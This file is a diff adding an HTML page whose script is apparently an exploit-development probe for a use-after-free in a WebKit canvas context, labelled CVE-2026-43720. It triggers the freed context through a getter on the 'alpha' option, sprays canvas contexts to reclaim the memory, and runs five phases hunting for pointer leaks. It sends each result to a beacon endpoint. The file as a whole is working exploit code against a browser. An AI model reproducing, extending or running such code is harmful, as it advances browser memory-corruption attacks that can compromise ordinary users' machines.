@@ -1,0 +1,446 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635e</title></head>
+<body><pre id="out">p635e: Canvas UAF info leak — pixel readback + shadow offset mismatch</pre>
+<script>
+'use strict';
+/*
+  p635e: CVE-2026-43720 info leak escalation
+  -- prior art: p635d confirmed 10 double + 8 string bidirectional R/W
+  -- prior art: shadowBlur/shadowOffsetX/shadowOffsetY do NOT alias (different storage)
+  -- prior art: AB cross-zone fails (bmalloc), cross-type ImageData crashes
+
+  CRASH_CLASS: MODERATE — alias reads on reclaimed heap, no raw pointer dereference
+
+  Strategy:
+  A) Pixel readback: draw through alias, getImageData through inner — look for
+     pointer fragments in pixel data if internal state is confused
+  B) Shadow offset mismatch: write large doubles to shadow* through alias,
+     read shadow* through inner — if offsets differ, we read adjacent fields
+  C) createLinearGradient/createPattern: these return objects with internal
+     pointers. Creating through alias, inspecting through inner may leak.
+  D) toDataURL through stale ref: after alias established, toDataURL on the
+     canvas may serialize internal state including pointers
+  E) Multiple UAF overlap: trigger 2 UAFs on different canvases, spray once,
+     check if both innerCtx refs alias the SAME spray object — gives 2 views
+     into one object at potentially different vtable offsets
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635E-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635e', msg:msg, level:'info', sid:'p635e-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 1; cv.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return {inner: inner, canvas: cv};
+}
+
+// Phase 0
+var tc = document.createElement('canvas');
+if (!tc.getContext('bitmaprenderer')) { bk('DEAD', 'no bmr'); throw new Error('no bmr'); }
+bk('P0', 'bmr OK');
+tc = null;
+
+// ================================================================
+// PHASE A: Pixel readback through confused state
+// ================================================================
+bk('A-START', 'pixel readback');
+var uafA = triggerUAF();
+if (!uafA.inner) {
+  bk('A-FAIL', 'no inner');
+} else {
+  // Spray to get alias
+  var sprayA = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayA.push({ctx: ctx, canvas: c});
+  }
+  var SENTA = 5555.25;
+  try { uafA.inner.lineWidth = SENTA; } catch(e) {}
+  var aliasA = -1;
+  for (var i = 0; i < sprayA.length; i++) {
+    if (sprayA[i].ctx.lineWidth === SENTA) { aliasA = i; break; }
+  }
+  bk('A-ALIAS', aliasA >= 0 ? 'spray[' + aliasA + ']' : 'NONE');
+
+  if (aliasA >= 0) {
+    var af = sprayA[aliasA];
+    // Draw something through alias context
+    af.ctx.fillStyle = '#ff0000';
+    af.ctx.fillRect(0, 0, 32, 32);
+
+    // Read pixels through the INNER context's canvas (the UAF canvas, 1x1)
+    // The inner's canvas is 1x1 but the alias canvas is 32x32
+    // Reading from the alias canvas should work
+    try {
+      var imgd = af.ctx.getImageData(0, 0, 32, 32);
+      // Check for non-red pixels that might be stale data
+      var anomalies = [];
+      for (var i = 0; i < imgd.data.length; i += 4) {
+        var r = imgd.data[i], g = imgd.data[i+1], b = imgd.data[i+2], a = imgd.data[i+3];
+        if (r !== 255 || g !== 0 || b !== 0 || a !== 255) {
+          anomalies.push('px[' + (i/4) + ']=' + r + ',' + g + ',' + b + ',' + a);
+          if (anomalies.length >= 10) break;
+        }
+      }
+      bk('A-PIXELS', anomalies.length > 0 ? anomalies.join(' ') : 'all red (clean)');
+    } catch(e) {
+      bk('A-PIXELS', 'ERR:' + e.message.slice(0,60));
+    }
+
+    // Now try: draw through INNER (the dangling ref), read through ALIAS
+    try {
+      uafA.inner.fillStyle = '#00ff00';
+      uafA.inner.fillRect(0, 0, 1, 1);
+      var imgd2 = af.ctx.getImageData(0, 0, 1, 1);
+      bk('A-CROSS-DRAW', 'inner drew green, alias reads: ' +
+         imgd2.data[0] + ',' + imgd2.data[1] + ',' + imgd2.data[2] + ',' + imgd2.data[3]);
+    } catch(e) {
+      bk('A-CROSS-DRAW', 'ERR:' + e.message.slice(0,60));
+    }
+
+    // Read uninitialized pixels from inner's 1x1 canvas
+    try {
+      var imgd3 = uafA.inner.getImageData(0, 0, 1, 1);
+      bk('A-INNER-PIX', imgd3.data[0] + ',' + imgd3.data[1] + ',' + imgd3.data[2] + ',' + imgd3.data[3]);
+    } catch(e) {
+      bk('A-INNER-PIX', 'ERR:' + e.message.slice(0,60));
+    }
+  }
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: Shadow offset mismatch exploration
+// shadowBlur/shadowOffsetX/shadowOffsetY don't alias (p635d).
+// Write specific values through inner, read through alias, and vice versa.
+// If the shadow fields are at different offsets, we might read adjacent data.
+// ================================================================
+bk('B-START', 'shadow offset mismatch');
+var uafB = triggerUAF();
+if (!uafB.inner) {
+  bk('B-FAIL', 'no inner');
+} else {
+  var sprayB = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayB.push(ctx);
+  }
+  var SENTB = 6666.5;
+  try { uafB.inner.lineWidth = SENTB; } catch(e) {}
+  var aliasB = -1;
+  for (var i = 0; i < sprayB.length; i++) {
+    if (sprayB[i].lineWidth === SENTB) { aliasB = i; break; }
+  }
+  bk('B-ALIAS', aliasB >= 0 ? 'spray[' + aliasB + ']' : 'NONE');
+
+  if (aliasB >= 0) {
+    var ab = sprayB[aliasB];
+
+    // Set all fields to known values through alias
+    ab.lineWidth = 1111;
+    ab.miterLimit = 2222;
+    ab.globalAlpha = 0.5;
+    ab.shadowBlur = 3333;
+    ab.shadowOffsetX = 4444;
+    ab.shadowOffsetY = 5555;
+    ab.lineDashOffset = 6666;
+
+    // Read ALL fields through inner
+    var readInner = {};
+    try { readInner.lw = uafB.inner.lineWidth; } catch(e) { readInner.lw = 'E'; }
+    try { readInner.ml = uafB.inner.miterLimit; } catch(e) { readInner.ml = 'E'; }
+    try { readInner.ga = uafB.inner.globalAlpha; } catch(e) { readInner.ga = 'E'; }
+    try { readInner.sb = uafB.inner.shadowBlur; } catch(e) { readInner.sb = 'E'; }
+    try { readInner.sox = uafB.inner.shadowOffsetX; } catch(e) { readInner.sox = 'E'; }
+    try { readInner.soy = uafB.inner.shadowOffsetY; } catch(e) { readInner.soy = 'E'; }
+    try { readInner.ldo = uafB.inner.lineDashOffset; } catch(e) { readInner.ldo = 'E'; }
+    bk('B-ALIAS-TO-INNER', JSON.stringify(readInner));
+
+    // Now reverse: set shadow fields through inner, read through alias
+    uafB.inner.shadowBlur = 7777;
+    uafB.inner.shadowOffsetX = 8888;
+    uafB.inner.shadowOffsetY = 9999;
+
+    var readAlias = {};
+    try { readAlias.sb = ab.shadowBlur; } catch(e) { readAlias.sb = 'E'; }
+    try { readAlias.sox = ab.shadowOffsetX; } catch(e) { readAlias.sox = 'E'; }
+    try { readAlias.soy = ab.shadowOffsetY; } catch(e) { readAlias.soy = 'E'; }
+    // Also read the aliased fields to see if shadow writes corrupted them
+    try { readAlias.lw = ab.lineWidth; } catch(e) { readAlias.lw = 'E'; }
+    try { readAlias.ml = ab.miterLimit; } catch(e) { readAlias.ml = 'E'; }
+    bk('B-INNER-TO-ALIAS', JSON.stringify(readAlias));
+
+    // Key question: did inner.shadowBlur=7777 change alias.shadowBlur from 3333?
+    // If NOT, shadow fields are in a different object (CanvasDrawingState vs context)
+    // If YES but to a different value, we have an offset confusion
+    if (readAlias.sb === 7777) {
+      bk('B-SHADOW-SYNCED', 'shadow fields DO alias (just not in p635d test)');
+    } else if (readAlias.sb === 3333) {
+      bk('B-SHADOW-SEPARATE', 'shadow fields stored in separate drawing state stack');
+    } else {
+      bk('B-SHADOW-CONFUSED', 'sb=' + readAlias.sb + ' (neither 3333 nor 7777) — OFFSET CONFUSION?');
+      bk('B-SHADOW-HEX', 'sb=' + f64hex(readAlias.sb));
+      if (isPointerLike(readAlias.sb)) bk('B-PTR', 'shadowBlur POINTER-LIKE');
+    }
+  }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: createLinearGradient / createPattern through alias
+// These return CanvasGradient/CanvasPattern objects with internal C++ pointers.
+// Creating through one handle, inspecting through other may expose state.
+// ================================================================
+bk('C-START', 'gradient/pattern');
+var uafC = triggerUAF();
+if (!uafC.inner) {
+  bk('C-FAIL', 'no inner');
+} else {
+  var sprayC = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayC.push(ctx);
+  }
+  var SENTC = 7777.25;
+  try { uafC.inner.lineWidth = SENTC; } catch(e) {}
+  var aliasC = -1;
+  for (var i = 0; i < sprayC.length; i++) {
+    if (sprayC[i].lineWidth === SENTC) { aliasC = i; break; }
+  }
+  bk('C-ALIAS', aliasC >= 0 ? 'spray[' + aliasC + ']' : 'NONE');
+
+  if (aliasC >= 0) {
+    var ac = sprayC[aliasC];
+
+    // Create gradient through alias
+    try {
+      var grad = ac.createLinearGradient(0, 0, 100, 100);
+      grad.addColorStop(0, '#ff0000');
+      grad.addColorStop(1, '#0000ff');
+      // Set as fillStyle through alias
+      ac.fillStyle = grad;
+      // Read fillStyle through inner — will it return the gradient or a string?
+      var fs = uafC.inner.fillStyle;
+      bk('C-GRAD-FS', 'type=' + typeof fs + ' val=' + String(fs).slice(0, 80));
+      // If it returns an object, inspect it
+      if (typeof fs === 'object' && fs !== null) {
+        bk('C-GRAD-OBJ', 'keys=' + Object.keys(fs).join(','));
+        // Try to coerce to string for any pointer leak
+        bk('C-GRAD-STR', '' + fs);
+      }
+    } catch(e) {
+      bk('C-GRAD', 'ERR:' + e.message.slice(0,60));
+    }
+
+    // Create pattern through alias
+    try {
+      var patCanvas = document.createElement('canvas');
+      patCanvas.width = 2; patCanvas.height = 2;
+      var patCtx = patCanvas.getContext('2d');
+      patCtx.fillStyle = '#ff00ff';
+      patCtx.fillRect(0, 0, 2, 2);
+      var pat = ac.createPattern(patCanvas, 'repeat');
+      ac.fillStyle = pat;
+      var fs2 = uafC.inner.fillStyle;
+      bk('C-PAT-FS', 'type=' + typeof fs2 + ' val=' + String(fs2).slice(0, 80));
+    } catch(e) {
+      bk('C-PAT', 'ERR:' + e.message.slice(0,60));
+    }
+
+    // createImageData — returns new ImageData, check for stale backing
+    try {
+      var cid = ac.createImageData(16, 16);
+      var nonzero = 0;
+      for (var i = 0; i < cid.data.length; i++) {
+        if (cid.data[i] !== 0) { nonzero++; }
+      }
+      bk('C-CID', 'createImageData(16,16) nonzero_bytes=' + nonzero + '/' + cid.data.length);
+      if (nonzero > 0) {
+        // Dump first non-zero bytes
+        var dump = [];
+        for (var i = 0; i < cid.data.length && dump.length < 20; i++) {
+          if (cid.data[i] !== 0) dump.push('[' + i + ']=' + cid.data[i]);
+        }
+        bk('C-CID-DUMP', dump.join(' '));
+      }
+    } catch(e) {
+      bk('C-CID', 'ERR:' + e.message.slice(0,40));
+    }
+  }
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: toDataURL on UAF canvas
+// ================================================================
+bk('D-START', 'toDataURL');
+var uafD = triggerUAF();
+if (!uafD.inner) {
+  bk('D-FAIL', 'no inner');
+} else {
+  var sprayD = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayD.push({ctx: ctx, canvas: c});
+  }
+  var SENTD = 3333.75;
+  try { uafD.inner.lineWidth = SENTD; } catch(e) {}
+  var aliasD = -1;
+  for (var i = 0; i < sprayD.length; i++) {
+    if (sprayD[i].ctx.lineWidth === SENTD) { aliasD = i; break; }
+  }
+  bk('D-ALIAS', aliasD >= 0 ? 'spray[' + aliasD + ']' : 'NONE');
+
+  if (aliasD >= 0) {
+    // toDataURL on the UAF canvas (1x1) — may serialize confused state
+    try {
+      var url1 = uafD.canvas.toDataURL();
+      bk('D-UAF-URL', url1.slice(0, 120));
+    } catch(e) {
+      bk('D-UAF-URL', 'ERR:' + e.message.slice(0,60));
+    }
+
+    // toDataURL on the alias canvas
+    try {
+      var url2 = sprayD[aliasD].canvas.toDataURL();
+      bk('D-ALIAS-URL', url2.slice(0, 120));
+    } catch(e) {
+      bk('D-ALIAS-URL', 'ERR:' + e.message.slice(0,60));
+    }
+
+    // Compare: are they the same?
+    try {
+      bk('D-SAME', (uafD.canvas.toDataURL() === sprayD[aliasD].canvas.toDataURL()) ? 'YES' : 'NO');
+    } catch(e) {}
+  }
+}
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: Double UAF — two dangling refs, one spray
+// If both innerCtx1 and innerCtx2 alias the same spray object,
+// we have 2 JS wrappers for 1 C++ object
+// ================================================================
+bk('E-START', 'double UAF overlap');
+var uaf1 = triggerUAF();
+var uaf2 = triggerUAF();
+if (!uaf1.inner || !uaf2.inner) {
+  bk('E-FAIL', 'inner1=' + !!uaf1.inner + ' inner2=' + !!uaf2.inner);
+} else {
+  var sprayE = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayE.push(ctx);
+  }
+  bk('E-SPRAY', sprayE.length);
+
+  // Check inner1 alias
+  var SENT1 = 1234.5;
+  try { uaf1.inner.lineWidth = SENT1; } catch(e) {}
+  var alias1 = -1;
+  for (var i = 0; i < sprayE.length; i++) {
+    if (sprayE[i].lineWidth === SENT1) { alias1 = i; break; }
+  }
+
+  // Check inner2 alias
+  var SENT2 = 5678.5;
+  try { uaf2.inner.lineWidth = SENT2; } catch(e) {}
+  var alias2 = -1;
+  for (var i = 0; i < sprayE.length; i++) {
+    if (sprayE[i].lineWidth === SENT2) { alias2 = i; break; }
+  }
+
+  bk('E-ALIASES', 'inner1→spray[' + alias1 + '] inner2→spray[' + alias2 + ']');
+
+  if (alias1 >= 0 && alias2 >= 0) {
+    if (alias1 === alias2) {
+      bk('E-OVERLAP', '★ SAME SPRAY OBJECT — two JS wrappers for one C++ context');
+      // This means writes through inner1 are visible through inner2
+      uaf1.inner.lineWidth = 9999;
+      bk('E-CROSS', 'inner1.lw=9999 → inner2.lw=' + uaf2.inner.lineWidth);
+    } else {
+      bk('E-SEPARATE', 'different spray objects (' + alias1 + ' vs ' + alias2 + ')');
+      // Still useful: check if they're adjacent
+      bk('E-ADJACENT', 'gap=' + Math.abs(alias2 - alias1));
+    }
+  }
+
+  // Extra: try writing a transform via inner1 that encodes a recognizable bit pattern
+  // and reading it as raw doubles via inner2 (if different objects, they're independent)
+  if (alias1 >= 0 && alias2 >= 0 && alias1 !== alias2) {
+    // Write a NaN-boxed value through inner1's transform
+    // IEEE754: NaN has exponent=0x7FF, any nonzero mantissa
+    // We can write specific NaN patterns through transform setTransform
+    // WebKit may normalize or reject NaN, let's test
+    try {
+      uaf1.inner.setTransform(NaN, 0, 0, NaN, 0, 0);
+      var tx1 = uaf1.inner.getTransform();
+      bk('E-NAN-TEST', 'set NaN → read a=' + tx1.a + ' d=' + tx1.d);
+    } catch(e) {
+      bk('E-NAN-TEST', 'ERR:' + e.message.slice(0,40));
+    }
+
+    // Test Infinity
+    try {
+      uaf1.inner.setTransform(Infinity, 0, 0, -Infinity, 0, 0);
+      var tx2 = uaf1.inner.getTransform();
+      bk('E-INF-TEST', 'set Inf → read a=' + tx2.a + ' d=' + tx2.d);
+    } catch(e) {
+      bk('E-INF-TEST', 'ERR:' + e.message.slice(0,40));
+    }
+  }
+}
+bk('E-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
